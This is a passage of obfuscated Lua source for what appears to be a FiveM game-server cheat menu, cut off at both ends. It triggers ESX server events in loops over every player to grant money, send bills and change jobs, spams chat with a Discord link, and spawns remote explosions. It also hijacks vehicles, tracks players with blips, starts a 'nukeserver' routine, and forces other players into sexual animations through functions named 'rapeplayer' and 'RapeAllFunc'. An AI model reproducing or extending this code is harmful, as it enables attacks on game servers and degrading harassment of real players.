                                '~g~\80\108\97\110\101\35\48\48\48\55\10 ~r~iSeekFR',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. '~b~https://discord.gg/FtMs4eA'
                            )
                        end
                        for i = 0, 256 do
                            udwdj(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            udwdj(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            udwdj(
                                'esx_billing:sendBill',
                                GetPlayerServerId(i),
                                'Purposeless',
                                '~g~\80\108\97\110\101\35\48\48\48\55\10 ~r~iSeekFR ~b~https://discord.gg/FtMs4eA',
                                43161337
                            )
                            udwdj('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
                            udwdj('NB:recruterplayer', i, 'police', 3)
                        end
                    end
                )
end

function ch(C,x,y)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(C)
    DrawText(x,y)
end

local function getPlayerIds()
    local players = {}
    for i = -1, 128 do
        if NetworkIsPlayerActive(i) then
            players[#players + 1] = i
        end
    end
    return players
end

function DrawText3D(x, y, z, text, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(0.0, 0.20)
    SetTextColour(r, g, b, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end

local RCCar = {}

-- Luminous Plane

RCCar.Start = function()
	if DoesEntityExist(RCCar.Entity) then return end

	RCCar.Spawn()

	RCCar.Tablet(waduyh487r64)

	while DoesEntityExist(RCCar.Entity) and DoesEntityExist(RCCar.Driver) do
		Citizen.Wait(5)

		local distanceCheck = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),  GetEntityCoords(RCCar.Entity), waduyh487r64)

		RCCar.DrawInstructions(distanceCheck)
		RCCar.HandleKeys(distanceCheck)

		if distanceCheck <= 10000000.0 then
			if not NetworkHasControlOfEntity(RCCar.Driver) then
				NetworkRequestControlOfEntity(RCCar.Driver)
			elseif not NetworkHasControlOfEntity(RCCar.Entity) then
				NetworkRequestControlOfEntity(RCCar.Entity)
			end
		else
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
		end
	end
end

RCCar.HandleKeys = function(distanceCheck)
	if IsControlJustReleased(0, 47) then
		if IsCamRendering(RCCar.Camera) then
			RCCar.ToggleCamera(KZjx)
		else
			RCCar.ToggleCamera(waduyh487r64)
		end
	end

	if distanceCheck <= 10000000.0 then
		if IsControlJustPressed(0, 73) then
			RCCar.Attach("pick")
		end
	end

	if distanceCheck < 10000000.0 then
	    if IsControlJustReleased(0, 108) then
		    local coos = GetEntityCoords(RCCar.Entity, waduyh487r64)
            AddExplosion(coos.x, coos.y, coos.z, 2, 100000.0, waduyh487r64, KZjx, 0)
		end
		if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 9, 1)
		end
		
		if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
		end

		if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 22, 1)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 13, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 14, 1)
		end

		if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 30, 100)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 7, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 8, 1)
		end

		if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 4, 1)
		end

		if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 5, 1)
		end
	end
end

RCCar.DrawInstructions = function(distanceCheck)
	local steeringButtons = {
		{
			["label"] = "Right",
			["button"] = "~INPUT_CELLPHONE_RIGHT~"
		},
		{
			["label"] = "Forward",
			["button"] = "~INPUT_CELLPHONE_UP~"
		},
		{
			["label"] = "Reverse",
			["button"] = "~INPUT_CELLPHONE_DOWN~"
		},
		{
			["label"] = "Left",
			["button"] = "~INPUT_CELLPHONE_LEFT~"
		}
	}

	local pickupButton = {
		["label"] = "Delete",
		["button"] = "~INPUT_VEH_DUCK~"
	}
	
	local explodeButton = {
		["label"] = "Explode",
		["button"] = "~INPUT_VEH_FLY_ROLL_LEFT_ONLY~"
	}

	local buttonsToDraw = {
		{
			["label"] = "Toggle Camera",
			["button"] = "~INPUT_DETONATE~"
		}
	}

	if distanceCheck <= 10000000.0 then
		for buttonIndex = 1, #steeringButtons do
			local steeringButton = steeringButtons[buttonIndex]

			table.insert(buttonsToDraw, steeringButton)
		end

		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, explodeButton)
		end
		
		if distanceCheck <= 1000000.0 then
			table.insert(buttonsToDraw, pickupButton)
		end
	end

    Citizen.CreateThread(function()
        local instructionScaleform = RequestScaleformMovie("instructional_buttons")

        while not HasScaleformMovieLoaded(instructionScaleform) do
            Wait(0)
        end

        PushScaleformMovieFunction(instructionScaleform, "CLEAR_ALL")
        PushScaleformMovieFunction(instructionScaleform, "TOGGLE_MOUSE_BUTTONS")
        PushScaleformMovieFunctionParameterBool(0)
        PopScaleformMovieFunctionVoid()

        for buttonIndex, buttonValues in ipairs(buttonsToDraw) do
            PushScaleformMovieFunction(instructionScaleform, "SET_DATA_SLOT")
            PushScaleformMovieFunctionParameterInt(buttonIndex - 1)

            PushScaleformMovieMethodParameterButtonName(buttonValues["button"])
            PushScaleformMovieFunctionParameterString(buttonValues["label"])
            PopScaleformMovieFunctionVoid()
        end

        PushScaleformMovieFunction(instructionScaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
        PushScaleformMovieFunctionParameterInt(-1)
        PopScaleformMovieFunctionVoid()
        DrawScaleformMovieFullscreen(instructionScaleform, 255, 255, 255, 255)
    end)
end

-- 4x482

RCCar.Spawn = function()
	RCCar.LoadModels({ Ggggg(RCCAR123), 68070371 })

	local spawnCoords, spawnHeading = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId())

	RCCar.Entity = CreateVehicle(Ggggg(RCCAR123), spawnCoords, spawnHeading, waduyh487r64)

	while not DoesEntityExist(RCCar.Entity) do
		Citizen.Wait(5)
	end

	RCCar.Driver = CreatePed(5, 68070371, spawnCoords, spawnHeading, waduyh487r64)

	SetEntityInvincible(RCCar.Driver, waduyh487r64)
	SetEntityVisible(RCCar.Driver, KZjx)
	FreezeEntityPosition(RCCar.Driver, waduyh487r64)
	SetPedAlertness(RCCar.Driver, 0.0)
    SetVehicleNumberPlateText(RCCar.Entity, "iSeekFR")
	TaskWarpPedIntoVehicle(RCCar.Driver, RCCar.Entity, -1)
   

	while not IsPedInVehicle(RCCar.Driver, RCCar.Entity) do
		Citizen.Wait(0)
	end

	RCCar.Attach("place")
end

RCCar.Attach = function(param)
	if not DoesEntityExist(RCCar.Entity) then
		return
	end
	
	RCCar.LoadModels({ "pickup_object" })

	if param == "place" then

		PlaceObjectOnGroundProperly(RCCar.Entity)
	elseif param == "pick" then
		if DoesCamExist(RCCar.Camera) then
			RCCar.ToggleCamera(KZjx)
		end

		RCCar.Tablet(KZjx)

		DeleteVehicle(RCCar.Entity)
		DeleteEntity(RCCar.Driver)

		RCCar.UnloadModels()
	end
end

RCCar.Tablet = function(boolean)
	if boolean then



	
		Citizen.CreateThread(function()
			while DoesEntityExist(RCCar.TabletEntity) do
				Citizen.Wait(5)
	

			end

			ClearPedTasks(PlayerPedId())
		end)
	else
		DeleteEntity(RCCar.TabletEntity)
	end
end

ConfigCamera = waduyh487r64

RCCar.ToggleCamera = function(boolean)
	if not ConfigCamera then return end

	if boolean then
		if not DoesEntityExist(RCCar.Entity) then return end 
		if DoesCamExist(RCCar.Camera) then DestroyCam(RCCar.Camera) end

		RCCar.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", waduyh487r64)

		AttachCamToEntity(RCCar.Camera, RCCar.Entity, 0.0, 0.0, 0.4, waduyh487r64)

		Citizen.CreateThread(function()
			while DoesCamExist(RCCar.Camera) do
				Citizen.Wait(5)

				SetCamRot(RCCar.Camera, GetEntityRotation(RCCar.Entity))
			end
		end)

		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), waduyh487r64) / 10)

		RenderScriptCams(1, 1, easeTime, 1, 1)

		Citizen.Wait(easeTime)

	else
		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), waduyh487r64) / 10)

		RenderScriptCams(0, 1, easeTime, 1, 0)

		Citizen.Wait(easeTime)

		ClearTimecycleModifier()

		DestroyCam(RCCar.Camera)
	end
end

RCCar.LoadModels = function(keduxbens)
	for keduxbenIndex = 1, #keduxbens do
		local keduxben = keduxbens[keduxbenIndex]

		if not RCCar.CachedModels then
			RCCar.CachedModels = {}
		end

		table.insert(RCCar.CachedModels, keduxben)

		if IsModelValid(keduxben) then
			while not HasModelLoaded(keduxben) do
				RequestModel(keduxben)
	
				Citizen.Wait(10)
			end
		else
			while not HasAnimDictLoaded(keduxben) do
				RequestAnimDict(keduxben)
	
				Citizen.Wait(10)
			end    
		end
	end
end

RCCar.UnloadModels = function()
	for keduxbenIndex = 1, #RCCar.CachedModels do
		local keduxben = RCCar.CachedModels[keduxbenIndex]

		if IsModelValid(keduxben) then
			SetModelAsNoLongerNeeded(keduxben)
		else
			RemoveAnimDict(keduxben)   
		end
	end
end

function pikgfrihfg(TextEntry, ExampleText, MaxStringLength)
    AddTextEntry("FMMC_KEY_TIP9N", TextEntry .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP9N", "", ExampleText, "", "", "", MaxStringLength)
    blockinput = waduyh487r64

    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end

    if UpdateOnscreenKeyboard() ~= 2 then
        local awd2323 = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        blockinput = KZjx
        return awd2323
    else
        Citizen.Wait(500)
        blockinput = KZjx
        return WADUI
    end
end

function DelVeh(vvvvvvvvvvvvvvvvvvvvvvvv)
    SetEntityAsMissionEntity(vvvvvvvvvvvvvvvvvvvvvvvv, 1, 1)
    DeleteEntity(vvvvvvvvvvvvvvvvvvvvvvvv)
end

function Clean(vvvvvvvvvvvvvvvvvvvvvvvv)
	SetVehicleDirtLevel(vvvvvvvvvvvvvvvvvvvvvvvv, 15.0)
end

function Clean2(vvvvvvvvvvvvvvvvvvvvvvvv)
	SetVehicleDirtLevel(vvvvvvvvvvvvvvvvvvvvvvvv, 1.0)
end

function GetInputMode()
    return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function TeleportToCoords()
    local x = pikgfrihfg("Enter X Pos", "", 100)
    local y = pikgfrihfg("Enter Y Pos", "", 100)
    local z = pikgfrihfg("Enter Z Pos", "", 100)
    local entity
    if x ~= "" and y ~= "" and z ~= "" then
        if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
        else
            entity = PlayerPedId()
        end
        if entity then
            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
        end
    else
        adyt23h23("~r~Invalid Coordinates, are you fucking stupid?")
    end
end

function TeleportToWaypoint()
    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        local blipIterator = GetBlipInfoIdIterator(8)
        local blip = GetFirstBlipInfoId(8, blipIterator)
        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) 
        wp = waduyh487r64



        local zHeigt = 0.0
        height = 1000.0
        while waduyh487r64 do
            Citizen.Wait(0)
            if wp then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end

                SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
                FreezeEntityPosition(entity, waduyh487r64)
                local Pos = GetEntityCoords(entity, waduyh487r64)

                if zHeigt == 0.0 then
                    height = height - 25.0
                    SetEntityCoords(entity, Pos.x, Pos.y, height)
                    bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
                else
                    SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
                    FreezeEntityPosition(entity, KZjx)
                    wp = KZjx
                    height = 1000.0
                    zHeigt = 0.0
                    adyt23h23("~g~Teleported to waypoint!")
                    break
                end
            end
        end
    else
        adyt23h23("~r~You have no waypoint?!")
    end
end

function rapeplayer()
    Citizen.CreateThread(
        function()
            RequestModelSync('a_m_o_acult_01')
            RequestAnimDict('rcmpaparazzo_2')
            while not HasAnimDictLoaded('rcmpaparazzo_2') do
                Citizen.Wait(0)
            end
            if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), waduyh487r64) then
                local vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), waduyh487r64)
                while not NetworkHasControlOfEntity(vvvvvvvvvvvvvvvvvvvvvvvv) do
                    NetworkRequestControlOfEntity(vvvvvvvvvvvvvvvvvvvvvvvv)
                    Citizen.Wait(0)
                end
                SetEntityAsMissionEntity(vvvvvvvvvvvvvvvvvvvvvvvv, waduyh487r64, waduyh487r64)
                DeleteVehicle(vvvvvvvvvvvvvvvvvvvvvvvv)
                DeleteEntity(vvvvvvvvvvvvvvvvvvvvvvvv)
            end
            count = -0.2
            for b = 1, 3 do
                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), waduyh487r64))
                local bz = CreatePed(4, Ggggg('a_m_o_acult_01'), x, y, z, 0.0, waduyh487r64, KZjx)
                SetEntityAsMissionEntity(bz, waduyh487r64, waduyh487r64)
                AttachEntityToEntity(
                    bz,
                    GetPlayerPed(SelectedPlayer),
                    4103,
                    11816,
                    count,
                    0.00,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    KZjx,
                    KZjx,
                    KZjx,
                    KZjx,
                    2,
                    waduyh487r64
                )
                ClearPedTasks(GetPlayerPed(SelectedPlayer))
                TaskPlayAnim(
                    GetPlayerPed(SelectedPlayer),
                    'rcmpaparazzo_2',
                    'shag_loop_poppy',
                    2.0,
                    2.5,
                    -1,
                    49,
                    0,
                    0,
                    0,
                    0
                )
                SetPedKeepTask(bz)
                TaskPlayAnim(bz, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                SetEntityInvincible(bz, waduyh487r64)
                count = count - 0.4
            end
        end
    )
end

function CreateDeer()
	local Model = Ggggg("\97\95\99\95\100\101\101\114\10")
	RequestModel(Model)
	while not HasModelLoaded(Model) do
		Citizen.Wait(50)
	end

	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, KZjx)

	Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), waduyh487r64, KZjx)

	SetPedCanRagdoll(Handle, Animal.Ragdoll)
	SetEntityInvincible(Handle, Animal.Invincible)
    SetPedDefaultComponentVariation(Handle)
	SetModelAsNoLongerNeeded(Model)
end

function RapeAllFunc()
    for bs=0,9 do
        udwdj("_chat:messageEntered","~r~",{141,211,255},"You just got fucked mate")
    end
    Citizen.CreateThread(function()
        for i=0,128 do
            RequestModelSync("a_m_o_acult_01")
            RequestAnimDict("rcmpaparazzo_2")
            while not HasAnimDictLoaded("rcmpaparazzo_2")do
                Citizen.Wait(0)
            end
            if IsPedInAnyVehicle(GetPlayerPed(i),waduyh487r64)then
                local vvvvvvvvvvvvvvvvvvvvvvvv=GetVehiclePedIsIn(GetPlayerPed(i),waduyh487r64)
                while not NetworkHasControlOfEntity(vvvvvvvvvvvvvvvvvvvvvvvv)do
                    NetworkRequestControlOfEntity(vvvvvvvvvvvvvvvvvvvvvvvv)
                    Citizen.Wait(0)
                end
                SetEntityAsMissionEntity(vvvvvvvvvvvvvvvvvvvvvvvv,waduyh487r64,waduyh487r64)
                DeleteVehicle(vvvvvvvvvvvvvvvvvvvvvvvv)DeleteEntity(vvvvvvvvvvvvvvvvvvvvvvvv)end
                count=-0.2
                for b=1,3 do
                    local x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(i),waduyh487r64))
                    local bD=CreatePed(4,Ggggg("a_m_o_acult_01"),x,y,z,0.0,waduyh487r64,KZjx)
                    SetEntityAsMissionEntity(bD,waduyh487r64,waduyh487r64)
                    AttachEntityToEntity(bD,GetPlayerPed(i),4103,11816,count,0.00,0.0,0.0,0.0,0.0,KZjx,KZjx,KZjx,KZjx,2,waduyh487r64)
                    ClearPedTasks(GetPlayerPed(i))TaskPlayAnim(GetPlayerPed(i),"rcmpaparazzo_2","shag_loop_poppy",2.0,2.5,-1,49,0,0,0,0)
                    SetPedKeepTask(bD)TaskPlayAnim(bD,"rcmpaparazzo_2","shag_loop_a",2.0,2.5,-1,49,0,0,0,0)
                    SetEntityInvincible(bD,waduyh487r64)count=count-0.4
            end
        end
    end)
end

function teleportToNearestVehicle()
            local playerPed = GetPlayerPed(-1)
            local playerPedPos = GetEntityCoords(playerPed, waduyh487r64)
            local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, waduyh487r64), 1000.0, 0, 4)
            local NearestVehiclePos = GetEntityCoords(NearestVehicle, waduyh487r64)
            local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, waduyh487r64), 1000.0, 0, 16384)
            local NearestPlanePos = GetEntityCoords(NearestPlane, waduyh487r64)
        adyt23h23("~y~Wait...")
        Citizen.Wait(1000)
        if (NearestVehicle == 0) and (NearestPlane == 0) then
            adyt23h23("~r~No Vehicle Found")
        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
            if IsVehicleSeatFree(NearestPlane, -1) then
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, KZjx)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, KZjx)
            else
                local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestPlane, -1)
                SetVehicleAlarm(NearestPlane, KZjx)
                SetVehicleDoorsLocked(NearestPlane, 1)
                SetVehicleNeedsToBeHotwired(NearestPlane, KZjx)
            end
            adyt23h23("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
            if IsVehicleSeatFree(NearestVehicle, -1) then
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, KZjx)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, KZjx)
            else
                local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                ClearPedTasksImmediately(driverPed)
                SetEntityAsMissionEntity(driverPed, 1, 1)
                DeleteEntity(driverPed)
                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                SetVehicleAlarm(NearestVehicle, KZjx)
                SetVehicleDoorsLocked(NearestVehicle, 1)
                SetVehicleNeedsToBeHotwired(NearestVehicle, KZjx)
            end
            adyt23h23("~g~Teleported Into Nearest Vehicle!")
        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
            if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestVehicle, -1) then
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, KZjx)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, KZjx)
                else
                    local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                    SetVehicleAlarm(NearestVehicle, KZjx)
                    SetVehicleDoorsLocked(NearestVehicle, 1)
                    SetVehicleNeedsToBeHotwired(NearestVehicle, KZjx)
                end
            elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
                if IsVehicleSeatFree(NearestPlane, -1) then
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, KZjx)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, KZjx)
                else
                    local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
                    ClearPedTasksImmediately(driverPed)
                    SetEntityAsMissionEntity(driverPed, 1, 1)
                    DeleteEntity(driverPed)
                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
                    SetVehicleAlarm(NearestPlane, KZjx)
                    SetVehicleDoorsLocked(NearestPlane, 1)
                    SetVehicleNeedsToBeHotwired(NearestPlane, KZjx)
                end
            end
            adyt23h23("~g~Teleported Into Nearest Vehicle!")
        end

    end



	local function d(e)
    local f = {}
    local h = GetGameTimer() / 200
    f.r = math.floor(math.sin(h * e + 0) * 127 + 128)
    f.g = math.floor(math.sin(h * e + 2) * 127 + 128)
    f.b = math.floor(math.sin(h * e + 4) * 127 + 128)
    return f
end
	
local cL = waduyh487r64
local cM = KZjx
local cN = waduyh487r64
local cO = waduyh487r64
Citizen.CreateThread(
    function()
        while waduyh487r64 do
            Wait(1)
            for f = 0, 128 do
                if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
                   local ped = GetPlayerPed(f)
                    blip = GetBlipFromEntity(ped)
                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), waduyh487r64))
                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), waduyh487r64))
                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, waduyh487r64))
                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(f), KZjx, KZjx, '', KZjx)
                    wantedLvl = GetPlayerWantedLevel(f)
                    if cM then
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, waduyh487r64)
                        if wantedLvl then
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, waduyh487r64)
                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                        else
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, KZjx)
                        end
                    else
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, KZjx)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, KZjx)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, KZjx)
                    end
                    if cL then
                        if not DoesBlipExist(blip) then
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, waduyh487r64)
                            SetBlipNameToPlayerName(blip, f)
                        else
                            vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsIn(ped, KZjx)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            elseif vvvvvvvvvvvvvvvvvvvvvvvv then
                                vehClass = GetVehicleClass(vvvvvvvvvvvvvvvvvvvvvvvv)
                                vehModel = GetEntityModel(vvvvvvvvvvvvvvvvvvvvvvvv)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehClass == 16 then
                                    if
                                        vehModel == Ggggg('besra') or vehModel == Ggggg('hydra') or
                                            vehModel == Ggggg('lazer')
                                     then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                            SetBlipNameToPlayerName(blip, f)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                    end
                                elseif
                                    vehModel == Ggggg('insurgent') or vehModel == Ggggg('insurgent2') or
                                        vehModel == Ggggg('limo2')
                                 then
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif vehModel == Ggggg('rhino') then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, KZjx)
                                        SetBlipNameToPlayerName(blip, f)
                                    end
                                elseif blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, waduyh487r64)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                                passengers = GetVehicleNumberOfPassengers(vvvvvvvvvvvvvvvvvvvvvvvv)
                                if passengers then
                                    if not IsVehicleSeatFree(vvvvvvvvvvvvvvvvvvvvvvvv, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, waduyh487r64)
                                    SetBlipNameToPlayerName(blip, f)
                                end
                            end
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(vvvvvvvvvvvvvvvvvvvvvvvv)))
                            SetBlipNameToPlayerName(blip, f)
                            SetBlipScale(blip, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(blip, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), waduyh487r64))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(f), waduyh487r64))
                                distance =
                                    math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) +
                                    900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    else
                        RemoveBlip(blip)
                    end
                end
            end
        end
    end
)

function ShootPlayer(player)
    local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, waduyh487r64)
end


function SpawnObjOnPlayer(keduxbenHash)
    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), waduyh487r64)
    local obj CreateObject(keduxbenHash, coords.x, coords.y, coords.z, waduyh487r64, waduyh487r64, waduyh487r64)
        if attachProp then
            AttachEntityToEntity(obj ,GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, waduyh487r64 ,waduyh487r64 ,KZjx, waduyh487r64, 1, waduyh487r64)
        end
end

function nukeserver()
    Citizen.CreateThread(function()
        local dg="Avenger"
        local dh="CARGOPLANE"
        local di="luxor"
        local dj="maverick"
        local dk="blimp2"

        while not HasModelLoaded(Ggggg(dh))do
